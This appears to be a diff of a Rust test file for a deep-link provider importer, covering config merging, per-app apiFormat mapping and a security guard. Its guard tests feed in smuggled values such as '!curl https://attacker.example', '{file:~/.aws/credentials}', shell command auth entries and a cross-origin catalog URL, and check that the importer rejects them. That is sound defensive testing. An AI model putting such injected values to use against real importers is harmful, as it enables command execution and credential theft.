+    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
+    assert_eq!(env["GEMINI_MODEL"], "gemini-2.0-flash");
+
+    let without_model = build_provider_from_request(&AppType::Gemini, &base).unwrap();
+    let env = without_model.settings_config["env"].as_object().unwrap();
+    assert!(env.get("GEMINI_MODEL").is_none());
 }
 
 #[test]
-fn test_codex_link_config_rejects_a_model_catalog_url_on_another_origin() {
-    // Codex 取目录时带着这个供应商的鉴权：别的源会把 Key 发到确认框里没显示的地方
-    let config = serde_json::json!({
+fn parse_and_merge_config_autofills_and_respects_url_override() {
+    let claude_cfg = BASE64_STANDARD.encode(
+        r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1","ANTHROPIC_MODEL":"claude-sonnet-4.5"}}"#,
+    );
+    let claude_merged = parse_and_merge_config(&DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("claude".to_string()),
+        name: Some("Test".to_string()),
+        config: Some(claude_cfg.clone()),
+        config_format: Some("json".to_string()),
+        ..Default::default()
+    })
+    .unwrap();
+    assert_eq!(claude_merged.api_key.as_deref(), Some("sk-ant-xxx"));
+    assert_eq!(
+        claude_merged.endpoint.as_deref(),
+        Some("https://api.anthropic.com/v1")
+    );
+    assert_eq!(
+        claude_merged.homepage.as_deref(),
+        Some("https://anthropic.com")
+    );
+    assert_eq!(claude_merged.model.as_deref(), Some("claude-sonnet-4.5"));
+
+    // URL 参数优先级高于内嵌 config
+    let override_merged = parse_and_merge_config(&DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("claude".to_string()),
+        name: Some("Test".to_string()),
+        api_key: Some("sk-new".to_string()),
+        config: Some(claude_cfg),
+        config_format: Some("json".to_string()),
+        ..Default::default()
+    })
+    .unwrap();
+    assert_eq!(override_merged.api_key.as_deref(), Some("sk-new"));
+    assert_eq!(
+        override_merged.endpoint.as_deref(),
+        Some("https://api.anthropic.com/v1")
+    );
+
+    // Codex 从 experimental_bearer_token 回填凭据
+    let codex_cfg = json!({
+        "auth": {},
         "config": concat!(
-            "[model_providers.custom]\n",
-            "base_url = \"https://api.relay.example/v1\"\n",
-            "model_catalog_url = \"https://collector.example/models\"\n",
+            "model_provider = \"rightcode\"\nmodel = \"gpt-5-codex\"\n\n",
+            "[model_providers.rightcode]\nbase_url = \"https://rightcode.example/v1\"\n",
+            "wire_api = \"responses\"\nexperimental_bearer_token = \"sk-rightcode\"\n",
+        ),
+    })
+    .to_string();
+    let codex_merged = parse_and_merge_config(&DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("codex".to_string()),
+        name: Some("RightCode".to_string()),
+        config: Some(BASE64_STANDARD.encode(codex_cfg)),
+        config_format: Some("json".to_string()),
+        ..Default::default()
+    })
+    .unwrap();
+    assert_eq!(codex_merged.api_key.as_deref(), Some("sk-rightcode"));
+    assert_eq!(
+        codex_merged.endpoint.as_deref(),
+        Some("https://rightcode.example/v1")
+    );
+    assert_eq!(
+        codex_merged.homepage.as_deref(),
+        Some("https://rightcode.example")
+    );
+    assert_eq!(codex_merged.model.as_deref(), Some("gpt-5-codex"));
+
+    // Grok Build 从默认模型表回填凭据与模型
+    let grok_cfg = json!({
+        "config": concat!(
+            "[models]\ndefault = \"grok-profile\"\n\n",
+            "[model.\"grok-profile\"]\nmodel = \"grok-upstream\"\n",
+            "base_url = \"https://grok.example/v1\"\nname = \"Grok Relay\"\n",
+            "api_key = \"sk-grok\"\napi_backend = \"responses\"\ncontext_window = 500000\n",
         )
-    });
-
-    let err = import_codex_with_config(config, None, None).unwrap_err();
-    assert!(err.to_string().contains("model_catalog_url"), "{err}");
+    })
+    .to_string();
+    let grok_merged = parse_and_merge_config(&DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("grokbuild".to_string()),
+        name: Some("Grok Relay".to_string()),
+        config: Some(BASE64_STANDARD.encode(grok_cfg)),
+        config_format: Some("json".to_string()),
+        ..Default::default()
+    })
+    .unwrap();
+    assert_eq!(grok_merged.api_key.as_deref(), Some("sk-grok"));
+    assert_eq!(
+        grok_merged.endpoint.as_deref(),
+        Some("https://grok.example/v1")
+    );
+    assert_eq!(grok_merged.model.as_deref(), Some("grok-upstream"));
+    assert_eq!(
+        grok_merged.homepage.as_deref(),
+        Some("https://grok.example")
+    );
 }
 
 #[test]
-fn test_codex_link_config_keeps_provider_settings_and_drops_global_ones() {
-    // #5510：web_search 这类供应商独有字段要留下；用户自己的全局设置不从链接收
-    let config = serde_json::json!({
+fn build_claude_provider_merges_custom_env_and_stays_minimal_without_config() {
+    let config_json = r#"{"env":{
+        "ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx",
+        "ANTHROPIC_BASE_URL":"https://api.example.com",
+        "ANTHROPIC_CUSTOM_HEADERS":"Cookie: session=abc",
+        "API_TIMEOUT_MS":"3000000",
+        "CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS":"1",
+        "ANTHROPIC_DEFAULT_HAIKU_MODEL":"haiku-from-config"
+    }}"#;
+
+    let provider = build_provider_from_request(
+        &AppType::Claude,
+        &DeepLinkImportRequest {
+            model: Some("main-model".to_string()),
+            haiku_model: Some("haiku-from-url".to_string()),
+            config: Some(BASE64_STANDARD.encode(config_json)),
+            config_format: Some("json".to_string()),
+            ..claude_provider_request()
+        },
+    )
+    .unwrap();
+    let env = provider.settings_config["env"].as_object().unwrap();
+    assert_eq!(env["ANTHROPIC_CUSTOM_HEADERS"], "Cookie: session=abc");
+    assert_eq!(env["API_TIMEOUT_MS"], "3000000");
+    assert_eq!(env["CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS"], "1");
+    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk-main");
+    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com/v1/");
+    assert_eq!(env["ANTHROPIC_MODEL"], "main-model");
+    assert_eq!(env["ANTHROPIC_DEFAULT_HAIKU_MODEL"], "haiku-from-url");
+
+    // 不带 config 时仅包含标准字段，不泄漏多余键
+    let plain = build_provider_from_request(&AppType::Claude, &claude_provider_request()).unwrap();
+    let plain_env = plain.settings_config["env"].as_object().unwrap();
+    assert_eq!(plain_env["ANTHROPIC_AUTH_TOKEN"], "sk-main");
+    assert_eq!(
+        plain_env["ANTHROPIC_BASE_URL"],
+        "https://api.example.com/v1/"
+    );
+    assert_eq!(plain_env.len(), 2);
+}
+
+#[test]
+fn codex_link_config_whitelist_override_and_projection() {
+    // #7438 / #7942 / #5510：白名单内的鉴权、同源目录地址、供应商独有字段透传到 live；
+    // 全局/危险设置与未知键全部丢弃；选路统一写成 custom，URL 参数覆盖配置并刷新 bearer token。
+    let config = json!({
+        "auth": { "OPENAI_API_KEY": "sk-link" },
         "config": concat!(
-            "model = \"gpt-5.5\"\n",
+            "model_provider = \"relay\"\n",
+            "model = \"from-config\"\n",
+            "model_reasoning_effort = \"medium\"\n",
             "web_search = \"live\"\n",
             "model_context_window = 400000\n",
             "approval_policy = \"never\"\n",
@@ -1375,25 +788,38 @@ fn test_codex_link_config_keeps_provider_settings_and_drops_global_ones() {
             "[features]\nstandalone_web_search = true\n\n",
             "[tools.web_search]\ncontext_size = \"high\"\n\n",
             "[mcp_servers.evil]\ncommand = \"sh\"\n\n",
-            "[model_providers.custom]\n",
-            "base_url = \"https://api.relay.example/v1\"\n",
+            "[model_providers.relay]\n",
+            "name = \"Relay Auth\"\n",
+            "base_url = \"https://old.relay.example/v1\"\n",
+            "wire_api = \"responses\"\n",
+            "requires_openai_auth = false\n",
+            "http_headers = { \"x-openai-actor-authorization\" = \"1\" }\n",
+            "supports_websockets = true\n",
             "supports_standalone_web_search = true\n",
+            "model_catalog_url = \"https://api.relay.example/v1/models?format=codex\"\n",
+            "experimental_bearer_token = \"sk-stale\"\n",
             "unknown_future_field = \"x\"\n",
         )
     });
 
-    let settings = import_codex_with_config(config, None, None).unwrap();
-    let doc = row_config(&settings);
+    let settings = import_codex_with_config(
+        config,
+        Some("https://api.relay.example/v1"),
+        Some("from-url"),
+    )
+    .unwrap();
+    assert_eq!(settings["auth"]["OPENAI_API_KEY"], "sk-link");
 
+    let doc = row_config(&settings);
+    assert_eq!(doc["model_provider"].as_str(), Some("custom"));
+    assert!(doc["model_providers"].get("relay").is_none());
+    assert_eq!(doc["model"].as_str(), Some("from-url"));
+    assert_eq!(doc["model_reasoning_effort"].as_str(), Some("medium"));
     assert_eq!(doc["web_search"].as_str(), Some("live"));
     assert_eq!(doc["model_context_window"].as_integer(), Some(400000));
     assert_eq!(
         doc["agents"]["default_subagent_model"].as_str(),
         Some("gpt-5.5-mini")
-    );
-    assert_eq!(
-        doc["model_providers"]["custom"]["supports_standalone_web_search"].as_bool(),
-        Some(true)
     );
     for dropped in [
         "approval_policy",
@@ -1408,13 +834,95 @@ fn test_codex_link_config_keeps_provider_settings_and_drops_global_ones() {
             "'{dropped}' must not be imported"
         );
     }
-    assert!(doc["model_providers"]["custom"]
-        .get("unknown_future_field")
-        .is_none());
+
+    let table = &doc["model_providers"]["custom"];
+    assert_eq!(table["name"].as_str(), Some("Relay Auth"));
+    assert_eq!(
+        table["base_url"].as_str(),
+        Some("https://api.relay.example/v1")
+    );
+    assert_eq!(table["wire_api"].as_str(), Some("responses"));
+    assert_eq!(table["requires_openai_auth"].as_bool(), Some(false));
+    assert_eq!(table["supports_websockets"].as_bool(), Some(true));
+    assert_eq!(
+        table["supports_standalone_web_search"].as_bool(),
+        Some(true)
+    );
+    assert_eq!(
+        table["http_headers"]["x-openai-actor-authorization"].as_str(),
+        Some("1")
+    );
+    assert_eq!(
+        table["model_catalog_url"].as_str(),
+        Some("https://api.relay.example/v1/models?format=codex")
+    );
+    assert_eq!(table["experimental_bearer_token"].as_str(), Some("sk-link"));
+    assert!(table.get("unknown_future_field").is_none());
+
+    let live = projected_route_table(&settings);
+    assert_eq!(live["experimental_bearer_token"].as_str(), Some("sk-link"));
+    assert_eq!(live["supports_websockets"].as_bool(), Some(true));
+    assert_eq!(
+        live["model_catalog_url"].as_str(),
+        Some("https://api.relay.example/v1/models?format=codex")
+    );
+    assert!(live["http_headers"]
+        .as_table_like()
+        .is_some_and(|headers| headers.contains_key("x-openai-actor-authorization")));
+
+    // configFormat=toml：整份就是 config.toml
+    let toml_text = concat!(
+        "model_provider = \"custom\"\nmodel = \"gpt-5.5\"\n\n",
+        "[model_providers.custom]\nname = \"Toml Relay\"\n",
+        "base_url = \"https://api.relay.example/v1\"\n",
+        "wire_api = \"responses\"\nsupports_websockets = true\n",
+        "experimental_bearer_token = \"sk-from-toml\"\n",
+    );
+    let merged = parse_and_merge_config(&DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("codex".to_string()),
+        name: Some("Relay".to_string()),
+        config: Some(BASE64_STANDARD.encode(toml_text)),
+        config_format: Some("toml".to_string()),
+        ..Default::default()
+    })
+    .unwrap();
+    assert_eq!(merged.api_key.as_deref(), Some("sk-from-toml"));
+    assert_eq!(
+        merged.endpoint.as_deref(),
+        Some("https://api.relay.example/v1")
+    );
+    assert_eq!(merged.model.as_deref(), Some("gpt-5.5"));
+    let toml_doc = row_config(
+        &build_provider_from_request(&AppType::Codex, &merged)
+            .unwrap()
+            .settings_config,
+    );
+    assert_eq!(
+        toml_doc["model_providers"]["custom"]["supports_websockets"].as_bool(),
+        Some(true)
+    );
+    assert_eq!(
+        toml_doc["model_providers"]["custom"]["name"].as_str(),
+        Some("Toml Relay")
+    );
 }
 
 #[test]
-fn test_codex_link_config_rejects_command_and_local_credential_sources() {
+fn codex_link_config_rejects_untrusted_sources_and_cross_origin_catalog() {
+    // 跨源 model_catalog_url 会把鉴权发往确认框未展示的域名
+    let cross_origin = json!({
+        "config": concat!(
+            "[model_providers.custom]\n",
+            "base_url = \"https://api.relay.example/v1\"\n",
+            "model_catalog_url = \"https://collector.example/models\"\n",
+        )
+    });
+    let err = import_codex_with_config(cross_origin, None, None).unwrap_err();
+    assert!(err.to_string().contains("model_catalog_url"), "{err}");
+
+    // 拒绝本机命令执行或本地凭据源
     for (key, snippet) in [
         ("auth", "[model_providers.custom.auth]\ncommand = \"sh\"\n"),
         (
@@ -1426,7 +934,7 @@ fn test_codex_link_config_rejects_command_and_local_credential_sources() {
             "[model_providers.custom.env_http_headers]\nx-key = \"HOME\"\n",
         ),
     ] {
-        let config = serde_json::json!({
+        let config = json!({
             "config": format!(
                 "[model_providers.custom]\nbase_url = \"https://api.relay.example/v1\"\n\n{snippet}"
             )
@@ -1434,118 +942,37 @@ fn test_codex_link_config_rejects_command_and_local_credential_sources() {
         let err = import_codex_with_config(config, None, None).unwrap_err();
         assert!(err.to_string().contains(key), "{key}: {err}");
     }
-}
 
-#[test]
-fn test_codex_link_config_drops_env_key_when_the_link_has_a_key() {
-    let config = serde_json::json!({
-        "config": concat!(
-            "[model_providers.custom]\n",
-            "base_url = \"https://api.relay.example/v1\"\n",
-            "env_key = \"RELAY_API_KEY\"\n",
-        )
+    // 链接自带 Key 时丢弃 env_key，切换走 bearer token
+    let with_env_key = json!({
+        "config": "[model_providers.custom]\nbase_url = \"https://api.relay.example/v1\"\nenv_key = \"RELAY_API_KEY\"\n"
     });
-
-    let settings = import_codex_with_config(config, None, None).unwrap();
-    let doc = row_config(&settings);
-    assert!(doc["model_providers"]["custom"].get("env_key").is_none());
-    // 没有 env_key，切换时 Key 走 bearer token
+    let settings = import_codex_with_config(with_env_key.clone(), None, None).unwrap();
+    assert!(row_config(&settings)["model_providers"]["custom"]
+        .get("env_key")
+        .is_none());
     assert_eq!(
         projected_route_table(&settings)["experimental_bearer_token"].as_str(),
         Some("sk-link")
     );
-}
 
-#[test]
-fn test_codex_link_with_only_env_key_is_rejected_by_name() {
-    let request = DeepLinkImportRequest {
+    // 仅靠 env_key 的链接必须指名 env_key 拒绝
+    let err = parse_and_merge_config(&DeepLinkImportRequest {
         version: "v1".to_string(),
         resource: "provider".to_string(),
         app: Some("codex".to_string()),
         name: Some("Relay".to_string()),
-        config: Some(BASE64_STANDARD.encode(
-            serde_json::json!({
-                "config": "[model_providers.custom]\nbase_url = \"https://api.relay.example/v1\"\nenv_key = \"RELAY_API_KEY\"\n"
-            })
-            .to_string(),
-        )),
+        config: Some(BASE64_STANDARD.encode(with_env_key.to_string())),
         config_format: Some("json".to_string()),
         ..Default::default()
-    };
-
-    let err = parse_and_merge_config(&request).unwrap_err();
+    })
+    .unwrap_err();
     assert!(err.to_string().contains("env_key"), "{err}");
 }
 
 #[test]
-fn test_codex_link_accepts_a_whole_config_toml() {
-    use super::provider::build_provider_from_request;
-
-    // configFormat=toml：整份就是 config.toml
-    let toml_text = concat!(
-        "model_provider = \"custom\"\nmodel = \"gpt-5.5\"\n\n",
-        "[model_providers.custom]\nname = \"Toml Relay\"\n",
-        "base_url = \"https://api.relay.example/v1\"\n",
-        "wire_api = \"responses\"\nsupports_websockets = true\n",
-        "experimental_bearer_token = \"sk-from-toml\"\n",
-    );
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("codex".to_string()),
-        name: Some("Relay".to_string()),
-        config: Some(BASE64_STANDARD.encode(toml_text)),
-        config_format: Some("toml".to_string()),
-        ..Default::default()
-    };
-
-    let merged = parse_and_merge_config(&request).unwrap();
-    assert_eq!(merged.api_key.as_deref(), Some("sk-from-toml"));
-    assert_eq!(
-        merged.endpoint.as_deref(),
-        Some("https://api.relay.example/v1")
-    );
-    assert_eq!(merged.model.as_deref(), Some("gpt-5.5"));
-
-    let settings = build_provider_from_request(&AppType::Codex, &merged)
-        .unwrap()
-        .settings_config;
-    let doc = row_config(&settings);
-    assert_eq!(
-        doc["model_providers"]["custom"]["supports_websockets"].as_bool(),
-        Some(true)
-    );
-    assert_eq!(
-        doc["model_providers"]["custom"]["name"].as_str(),
-        Some("Toml Relay")
-    );
-}
-
-// ============ Grok Build：链接附带的 config.toml ============
-
-fn import_grok_with_config(config_toml: &str) -> Result<serde_json::Value, crate::error::AppError> {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("grokbuild".to_string()),
-        name: Some("Relay Card".to_string()),
-        endpoint: Some("https://api.relay.example/v1".to_string()),
-        api_key: Some("xai-link".to_string()),
-        config: Some(
-            BASE64_STANDARD.encode(serde_json::json!({ "config": config_toml }).to_string()),
-        ),
-        config_format: Some("json".to_string()),
-        ..Default::default()
-    };
-    let merged = parse_and_merge_config(&request)?;
-    Ok(build_provider_from_request(&AppType::GrokBuild, &merged)?.settings_config)
-}
-
-#[test]
-fn test_grok_link_config_keeps_the_selected_profile_fields() {
-    // #6457：显示名、说明、窗口等来自链接的模型表；地址和 Key 用链接参数
+fn grok_link_config_whitelist_defaults_and_projection() {
+    // #6457：保留选中模型表的白名单字段；地址与 Key 由链接参数覆盖；剥离 env_key 与多余模型表
     let settings = import_grok_with_config(concat!(
         "[models]\ndefault = \"grok-4.6\"\n\n",
         "[model.\"grok-4.6\"]\nmodel = \"grok-4.6\"\nname = \"Grok 4.6 (Relay)\"\n",
@@ -1576,33 +1003,29 @@ fn test_grok_link_config_keeps_the_selected_profile_fields() {
     );
     assert_eq!(table["api_key"].as_str(), Some("xai-link"));
     assert!(table.get("env_key").is_none(), "{text}");
-    // 一个供应商只拥有一张模型表，其余的不导入
     assert!(doc["model"].get("grok-4.5").is_none(), "{text}");
 
-    // 行能被投影（切换时写进 live 的就是这张表）
     let projection = crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
     assert_eq!(projection.table_name(), Some("grok-4.6"));
-}
 
-#[test]
-fn test_grok_link_config_fills_template_defaults_for_missing_fields() {
-    let settings = import_grok_with_config(
+    // 缺失字段按模板补齐默认值并通过投影校验
+    let minimal = import_grok_with_config(
         "[models]\ndefault = \"relay\"\n\n[model.relay]\nmodel = \"relay-model\"\n",
     )
     .unwrap();
-    let doc: toml_edit::DocumentMut = settings["config"].as_str().unwrap().parse().unwrap();
-    let table = &doc["model"]["relay"];
-    assert_eq!(table["name"].as_str(), Some("Relay Card"));
-    assert_eq!(table["model"].as_str(), Some("relay-model"));
+    let min_doc: toml_edit::DocumentMut = minimal["config"].as_str().unwrap().parse().unwrap();
+    let min_table = &min_doc["model"]["relay"];
+    assert_eq!(min_table["name"].as_str(), Some("Relay Card"));
+    assert_eq!(min_table["model"].as_str(), Some("relay-model"));
     assert_eq!(
-        table["api_backend"].as_str(),
+        min_table["api_backend"].as_str(),
         Some(crate::grok_config::DEFAULT_API_BACKEND)
     );
     assert_eq!(
-        table["context_window"].as_integer(),
+        min_table["context_window"].as_integer(),
         Some(crate::grok_config::DEFAULT_CONTEXT_WINDOW)
     );
-    crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
+    crate::live::project::grok::GrokProjection::of(&minimal, false).unwrap();
 }
 
 #[test]
@@ -1624,78 +1047,81 @@ fn test_grok_link_config_rejects_credential_providers_and_local_files() {
 }
 
 // =============================================================================
-// apiFormat：一套取值，按应用换算
+// apiFormat
 // =============================================================================
 
-fn provider_link(app: &str, api_format: Option<&str>) -> String {
-    let mut url = format!(
-        "ccswitch://v1/import?resource=provider&app={app}&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=example-model"
-    );
-    if let Some(format) = api_format {
-        url.push_str(&format!("&apiFormat={format}"));
-    }
-    url
-}
-
-fn build_from_link(app: &str, api_format: Option<&str>) -> crate::provider::Provider {
-    use super::provider::build_provider_from_request;
-    let request = parse_deeplink_url(&provider_link(app, api_format)).expect("parse link");
-    let app_type: AppType = app.parse().expect("app type");
-    build_provider_from_request(&app_type, &request).expect("build provider")
-}
-
 #[test]
-fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
-    let cases = [
-        ("opencode", "npm", "anthropic", "@ai-sdk/anthropic"),
+fn api_format_maps_explicit_and_default_protocols_per_app() {
+    for (app, field, format, expected) in [
+        ("opencode", "npm", Some("anthropic"), "@ai-sdk/anthropic"),
         (
             "opencode",
             "npm",
-            "openai_chat",
+            Some("openai_chat"),
             "@ai-sdk/openai-compatible",
         ),
-        ("opencode", "npm", "openai_responses", "@ai-sdk/openai"),
-        ("opencode", "npm", "gemini_native", "@ai-sdk/google"),
-        ("openclaw", "api", "anthropic", "anthropic-messages"),
-        ("openclaw", "api", "openai_responses", "openai-responses"),
-        ("openclaw", "api", "gemini_native", "google-generative-ai"),
-        ("hermes", "api_mode", "anthropic", "anthropic_messages"),
-        ("hermes", "api_mode", "openai_responses", "codex_responses"),
-        ("pi", "api", "anthropic", "anthropic-messages"),
-        ("pi", "api", "openai_responses", "openai-responses"),
-        ("pi", "api", "gemini_native", "google-generative-ai"),
-        ("omp", "api", "anthropic", "anthropic-messages"),
-        ("omp", "api", "openai_responses", "openai-responses"),
-        ("omp", "api", "gemini_native", "google-generative-ai"),
-        ("mcode", "api", "anthropic", "anthropic-messages"),
-        ("mcode", "api", "openai_responses", "openai-responses"),
-        ("dsh", "api", "anthropic", "anthropic-messages"),
-        ("dsh", "api", "openai_responses", "openai-responses"),
-    ];
-    for (app, field, format, expected) in cases {
-        let provider = build_from_link(app, Some(format));
+        (
+            "opencode",
+            "npm",
+            Some("openai_responses"),
+            "@ai-sdk/openai",
+        ),
+        ("opencode", "npm", Some("gemini_native"), "@ai-sdk/google"),
+        ("opencode", "npm", None, "@ai-sdk/openai-compatible"),
+        ("openclaw", "api", Some("anthropic"), "anthropic-messages"),
+        (
+            "openclaw",
+            "api",
+            Some("openai_responses"),
+            "openai-responses",
+        ),
+        (
+            "openclaw",
+            "api",
+            Some("gemini_native"),
+            "google-generative-ai",
+        ),
+        ("openclaw", "api", None, "openai-completions"),
+        (
+            "hermes",
+            "api_mode",
+            Some("anthropic"),
+            "anthropic_messages",
+        ),
+        (
+            "hermes",
+            "api_mode",
+            Some("openai_responses"),
+            "codex_responses",
+        ),
+        ("hermes", "api_mode", None, "chat_completions"),
+        ("pi", "api", Some("anthropic"), "anthropic-messages"),
+        ("pi", "api", Some("openai_responses"), "openai-responses"),
+        ("pi", "api", Some("gemini_native"), "google-generative-ai"),
+        ("pi", "api", None, "openai-completions"),
+        ("omp", "api", Some("anthropic"), "anthropic-messages"),
+        ("omp", "api", Some("openai_responses"), "openai-responses"),
+        ("omp", "api", Some("gemini_native"), "google-generative-ai"),
+        ("omp", "api", None, "openai-completions"),
+        ("mcode", "api", Some("anthropic"), "anthropic-messages"),
+        ("mcode", "api", Some("openai_responses"), "openai-responses"),
+        ("mcode", "api", None, "openai-completions"),
+        ("dsh", "api", Some("anthropic"), "anthropic-messages"),
+        ("dsh", "api", Some("openai_responses"), "openai-responses"),
+        ("dsh", "api", None, "openai-completions"),
+        ("zcode", "kind", Some("anthropic"), "anthropic"),
+        ("zcode", "kind", Some("openai_chat"), "openai-compatible"),
+        ("zcode", "kind", Some("openai_responses"), "openai"),
+        ("zcode", "kind", None, "openai-compatible"),
+    ] {
+        let provider = build_from_link(app, format);
         assert_eq!(
             provider.settings_config[field], expected,
-            "{app} apiFormat={format}"
+            "{app} apiFormat={format:?}"
         );
     }
-}
 
-#[test]
-fn test_links_without_api_format_keep_each_apps_previous_protocol() {
-    let cases = [
-        ("opencode", "npm", "@ai-sdk/openai-compatible"),
-        ("openclaw", "api", "openai-completions"),
-        ("hermes", "api_mode", "chat_completions"),
-        ("pi", "api", "openai-completions"),
-        ("omp", "api", "openai-completions"),
-        ("mcode", "api", "openai-completions"),
-        ("dsh", "api", "openai-completions"),
-    ];
-    for (app, field, expected) in cases {
-        let provider = build_from_link(app, None);
-        assert_eq!(provider.settings_config[field], expected, "{app}");
-    }
+    // 切换式应用：无 apiFormat 不写入 meta.apiFormat；有则记录路由格式
     for app in ["claude", "codex", "grokbuild"] {
         let provider = build_from_link(app, None);
         assert!(
@@ -1703,10 +1129,6 @@ fn test_links_without_api_format_keep_each_apps_previous_protocol() {
             "{app}: a link without apiFormat must not add meta.apiFormat"
         );
     }
-}
-
-#[test]
-fn test_api_format_marks_routed_formats_on_claude_codex_and_grok() {
     for (app, format) in [
         ("claude", "openai_chat"),
         ("claude", "gemini_native"),
@@ -1745,86 +1167,12 @@ fn test_api_format_rejects_unknown_values_and_unsupported_apps() {
     }
 }
 
-#[test]
-fn test_pi_link_builds_a_models_json_node() {
-    let provider = build_from_link("pi", Some("anthropic"));
-    assert_eq!(
-        provider.settings_config,
-        serde_json::json!({
-            "name": "Example",
-            "baseUrl": "https://api.example.com/v1",
-            "apiKey": "sk-test",
-            "api": "anthropic-messages",
-            "models": [{ "id": "example-model", "name": "example-model" }],
-        })
-    );
-}
-
 // =============================================================================
-// enabled：确认框开关的值。累加式应用决定是否写进应用配置，不调用切换
+// Additive-App Dynamic Syntax Security Guard
 // =============================================================================
 
-fn import_pi_link(enabled: Option<bool>) -> (AppState, String) {
-    let mut request =
-        parse_deeplink_url(&provider_link("pi", Some("openai_chat"))).expect("parse link");
-    request.enabled = enabled;
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
-    let id = super::import_provider_from_deeplink(&state, request).expect("import Pi provider");
-    (state, id)
-}
-
 #[test]
-#[serial_test::serial]
-fn test_pi_link_with_the_toggle_off_is_saved_without_touching_models_json() {
-    let _home = TempUserHome::new();
-    let _agent = crate::pi_config::test_support::TestAgentDir::new();
-
-    let (state, id) = import_pi_link(Some(false));
-
-    assert!(state
-        .db
-        .get_provider_by_id(&id, &AppType::Pi)
-        .unwrap()
-        .is_some());
-    assert!(!crate::pi_config::pi_provider_exists(&id).unwrap());
-}
-
-#[test]
-#[serial_test::serial]
-fn test_pi_link_with_the_toggle_on_or_unset_is_added_to_models_json() {
-    let _home = TempUserHome::new();
-    let _agent = crate::pi_config::test_support::TestAgentDir::new();
-
-    for enabled in [Some(true), None] {
-        let (_state, id) = import_pi_link(enabled);
-        let node = crate::pi_config::read_pi_native_provider(&id)
-            .unwrap()
-            .expect("node written to models.json");
-        assert_eq!(node["api"], "openai-completions", "{enabled:?}");
-    }
-}
-
-// =============================================================================
-// 累加式应用会解释的写法：命令、环境变量、文件引用
-// =============================================================================
-
-fn link_with(app: &str, param: &str, raw_value: &str) -> String {
-    let base = provider_link(app, None);
-    let value: String = url::form_urlencoded::byte_serialize(raw_value.as_bytes()).collect();
-    // provider_link 已带 endpoint / apiKey / model，替换掉同名参数
-    let mut url = url::Url::parse(&base).unwrap();
-    let pairs: Vec<(String, String)> = url
-        .query_pairs()
-        .filter(|(key, _)| key != param)
-        .map(|(key, value)| (key.into_owned(), value.into_owned()))
-        .collect();
-    url.query_pairs_mut().clear().extend_pairs(pairs);
-    format!("{url}&{param}={value}")
-}
-
-#[test]
-fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rejected() {
+fn additive_dynamic_syntax_guard_rejects_smuggling_and_allows_ordinary_values() {
     for (app, param, value) in [
         ("pi", "apiKey", "!printf review-fixture"),
         ("pi", "apiKey", "  !curl https://attacker.example"),
@@ -1871,10 +1219,8 @@ fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rej
             "{app}/{param}={value}: {err}"
         );
     }
-}
 
-#[test]
-fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
+    // 正常值不误杀
     for (app, param, value) in [
         ("pi", "apiKey", "sk-abc$1def"),
         ("pi", "apiKey", "sk-ends-with-!"),
@@ -1889,13 +1235,8 @@ fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
         parse_deeplink_url(&link_with(app, param, value))
             .unwrap_or_else(|err| panic!("{app}/{param}={value} should parse: {err}"));
     }
-}
 
-#[test]
-fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests() {
-    use super::provider::build_provider_from_request;
-
-    // config 里补来的 Key 在合并时就拒绝
+    // 纵深防线：config 合并补来的值 & 绕过解析器直调 build_provider_from_request 同样拦截
     let config = BASE64_STANDARD.encode(r#"{"apiKey":"{file:~/.aws/credentials}"}"#);
     let url = format!(
         "ccswitch://v1/import?resource=provider&app=opencode&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&model=m&config={config}"
@@ -1903,8 +1244,7 @@ fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests(
     let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
     assert!(parse_and_merge_config(&request).is_err());
 
-    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
-    let request = DeepLinkImportRequest {
+    let direct = DeepLinkImportRequest {
         resource: "provider".to_string(),
         app: Some("pi".to_string()),
         name: Some("Example".to_string()),
@@ -1913,30 +1253,89 @@ fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests(
         model: Some("m".to_string()),
         ..Default::default()
     };
-    assert!(build_provider_from_request(&AppType::Pi, &request).is_err());
-}
-
-// =============================================================================
-// 切换式应用关掉「导入后立即切换」：只存进列表，即使还没有当前供应商
-// =============================================================================
-
-fn import_claude_link(enabled: Option<bool>) -> (AppState, String) {
-    let mut request = parse_deeplink_url(&provider_link("claude", None)).expect("parse link");
-    request.enabled = enabled;
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
-    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
-    (state, id)
+    assert!(build_provider_from_request(&AppType::Pi, &direct).is_err());
 }
 
 #[test]
 #[serial_test::serial]
-fn test_first_switch_mode_provider_stays_inactive_when_the_toggle_is_off() {
